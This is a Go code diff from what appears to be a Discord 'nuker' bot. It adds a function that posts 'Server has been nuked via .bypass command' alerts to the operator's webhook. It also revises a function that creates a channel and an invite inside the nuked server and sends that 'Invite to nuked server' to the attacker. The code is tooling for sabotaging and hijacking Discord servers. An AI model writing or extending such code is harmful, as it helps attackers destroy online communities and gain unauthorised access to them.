@@ -56,20 +56,48 @@ func Logs(s *discordgo.Session, m *discordgo.MessageCreate) {
 	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
 }
 
-func InviteCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	godotenv.Load()
-	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
+func LogsAlert(s *discordgo.Session, m *discordgo.MessageCreate) {
 
-	channel, err := s.GuildChannelCreate(m.GuildID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)
+	guild, err := s.State.Guild(m.GuildID)
 	if err != nil {
-		fmt.Println("Error marshalling JSON:", err)
+		fmt.Println("Error getting guild: ", err)
 		return
 	}
 
 	godotenv.Load()
 	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")
 
-	invite, _ := s.ChannelInviteCreate(channel.ID, discordgo.Invite{})
+	embed := discordgo.MessageEmbed{
+		Title: "Server " + fmt.Sprint(guild.Name) + " has been nuked via ``.bypass`` command.",
+		Color: 00255,
+	}
+
+	data := &discordgo.WebhookParams{
+		Embeds: []*discordgo.MessageEmbed{&embed},
+	}
+	jsonData, _ := json.Marshal(data)
+
+	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
+}
+
+func InviteCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
+	godotenv.Load()
+	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
+
+	channel, err := s.GuildChannelCreate(m.GuildID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)
+	if err != nil {
+		fmt.Println("Error creating invite:", err)
+		return
+	}
+
+	godotenv.Load()
+	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")
+
+	invite, err := s.ChannelInviteCreate(channel.ID, discordgo.Invite{})
+	if err != nil {
+		fmt.Println("Error creating invite:", err)
+		return
+	}
 
 	embed := discordgo.MessageEmbed{
 		Title:       "Invite to nuked server",
@@ -80,7 +108,11 @@ func InviteCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	data := &discordgo.WebhookParams{
 		Embeds: []*discordgo.MessageEmbed{&embed},
 	}
-	jsonData, _ := json.Marshal(data)
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("Error creating invite:", err)
+		return
+	}
 
 	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
 }
